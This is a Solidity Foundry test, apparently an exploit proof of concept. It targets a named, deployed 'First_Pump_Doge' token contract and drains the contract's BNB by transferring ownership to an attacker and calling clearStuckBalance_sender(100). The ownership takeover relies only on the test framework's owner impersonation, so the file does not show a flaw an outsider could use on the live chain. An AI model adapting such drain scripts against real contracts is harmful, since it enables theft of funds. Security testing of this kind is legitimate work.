pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface First_Pump_Doge {
    function getOwner() external view returns (address);
    function clearStuckBalance_sender(uint256 amountPercentage) external;
    function rescueToken(address tokenAddress, uint256 tokens) external returns (bool);
    function transferOwnership(address newOwner) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xB19a9F26956d3d3c162c07A2509359AB42E0013d;
    address attacker;
    First_Pump_Doge target;
    uint256 initialBalance;
    address owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        attacker = address(this);
        target = First_Pump_Doge(TARGET);
        vm.label(TARGET, "FirstPumpDoge Victim");
        vm.label(attacker, "Attacker");

        // Get the owner address
        owner = target.getOwner();
        vm.label(owner, "Contract Owner");

        // Record initial attacker balance
        initialBalance = attacker.balance;
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // First, inject BNB into the target contract so there's something to drain
        deal(TARGET, 10 ether);

        // Impersonate the current owner and transfer ownership to attacker
        vm.startPrank(owner);
        target.transferOwnership(payable(attacker));
        vm.stopPrank();

        // Now as the new owner, drain 100% of the contract's BNB balance
        target.clearStuckBalance_sender(100);

        // Verify attacker's balance increased
        assertGt(attacker.balance, initialBalance, "Attacker balance should have increased after draining contract BNB");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

